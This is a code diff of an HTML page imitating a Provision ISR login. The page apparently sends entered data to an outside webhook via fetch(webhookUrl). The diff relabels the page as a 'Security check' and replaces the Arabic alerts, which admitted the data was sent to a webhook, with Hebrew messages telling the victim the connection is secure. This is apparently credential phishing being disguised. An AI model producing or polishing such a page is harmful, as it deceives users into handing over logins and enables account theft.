@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>تسجيل دخول Provision ISR</title>
+    <title> Provision ISR Security check 🔐 </title>
     <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
     <link rel="shortcut icon" type="image/x-icon" href="favicon.ico" media="screen" />
     <meta http-equiv="Expires" content="0">
@@ -76,12 +76,16 @@
             fetch(webhookUrl)
                 .then(response => response.text())
                 .then(data => {
-                    alert('تم إرسال البيانات بنجاح إلى Webhook.');
+                    alert('✅️ החיבור שלך מאובטח.');
                 })
                 .catch(error => {
-                    alert('حدث خطأ أثناء إرسال البيانات إلى Webhook: ' + error);
+                    alert(' ❌️ תקלה בבדיקת אבטחה' + error);
                 });
         }
     </script>
 </body>
 </html>
+
+ 
+ 
+ 
